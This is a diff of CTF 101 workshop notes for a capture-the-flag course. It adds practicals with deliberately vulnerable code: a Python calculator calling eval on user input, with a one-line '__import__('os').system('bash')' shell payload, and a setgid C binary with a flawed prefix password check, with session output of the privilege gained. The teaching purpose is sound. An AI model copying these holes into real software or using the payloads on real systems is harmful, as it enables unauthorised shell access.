@@ -19,13 +19,17 @@ Topics to Cover
     * CTF 101
 * Introduction to the Pico Platform
     * Accessing the CTF101 Scoreboard
+    * CTF101 Infrastructure
+    * Flag Formats
+    * Necessary Tools
 * Introduction to Software Exploitation
     * Scripting Languages
         * Source code auditing
         * Classes of Vulnerabilities
+        * Demonstration: Classes of Vulnerabilities
     * Contrast between Scripts and Binaries
 * Representation of Code as Data
-* x86-64 Primer
+* Memory Corruption Teaser
 
 Workshop Agenda
 ===============
@@ -699,21 +703,116 @@ if __name__ == "__main__":
     main()
 ```
 
-This is a pretty long one so we'll identify things step by step.
-
+This is a pretty long one so we'll identify things step by step in the lecture.
 
 
 ### Practical 5: Arbitrary Code Execution
 
 Itching to pop a shell yet? In this practical example, you'll finally get to.
+Download the source from the scoreboard and review it.
+
+```python
+#! /usr/bin/python
+
+import sys
 
 
+def main():
+    write("SuperCalculator (e.g. 2+2): ")
+    eqn = sys.stdin.readline().strip()
+    answer = eval(eqn)
+    write("%s = %s\n" % (eqn, answer))
 
+
+def write(data):
+    sys.stdout.write(data)
+    sys.stdout.flush()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Now, whenever a script uses an evaluate statement over user supplied input an
+exploitable bug is bound to be discovered within. In this case, arbitrary python
+code can be written as payload to spawn a remote shell. However, we have to be
+very careful to write it as one line due to the nature of the code. Try to get a
+usable shell!
+
+There are multiple solutions, but here is one:
+
+```
+$ python codeexec.py
+SuperCalculator (e.g. 2+2): __import__("os").system("bash")
+$
+```
 
 ### Practial 6: Privilege Escalation
 
 Now let's try something different. SSH into the server.
 
+```
+$ ssh escalate@play.nusgreyhats.org
+escalate@play.nusgreyhats.org's password:
+Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.13.0-57-generic x86_64)
+$ ls -l
+total 16
+-rwxr-sr-x 1 root privesca 7560 Aug 14 16:32 escalate
+-rw-r--r-- 1 root root      562 Aug 14 16:32 escalate.c
+-r--r----- 1 root privesca   31 Aug 14 16:32 flag
+$
+```
+
+This is very typical of a local exploit challenge (as opposed to the mostly
+remote ones we have been doing). Notice the setgid bit is set for the executable
+binary escalate. This means that the binary will be run with the privileges of
+that group. Now, let's get more information about the binary by looking at the
+source code.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int check(char *user_pass, char *pass) {
+    int index = 0;
+    while (user_pass[index] != 0) {
+        if (user_pass[index] != pass[index]) {
+            return 0;
+        }
+        index++;
+    }
+    return 1;
+}
+
+int main(int argc, char *argv[]) {
+    char user_pass[256];
+    printf("Password: ");
+    scanf("%255s", user_pass);
+    if (check(user_pass, "XXXXXXXXXXXXXX")) {
+        printf("Win!\n");
+        setuid(0);
+        system("/bin/sh");
+    }
+    else {
+        printf("Fail!\n");
+    }
+}
+```
+
+Looks like the password's been redacted. However, there's an insecure password
+check in the check routine. Can you figure it out?
+
+```
+$ id
+uid=1006(escalate) gid=1006(escalate) groups=1006(escalate)
+$ ./escalate
+Password: <redacted>
+Win!
+$ id
+uid=1006(escalate) gid=1006(escalate) egid=1005(privesca) groups=1006(escalate)
+$
+```
 
 Contrast between Scripts and Binaries
 -------------------------------------
@@ -722,4 +821,5 @@ Contrast between Scripts and Binaries
 Representation of Programs as Data
 ==================================
 
-
+Memory Corruption Teaser
+========================
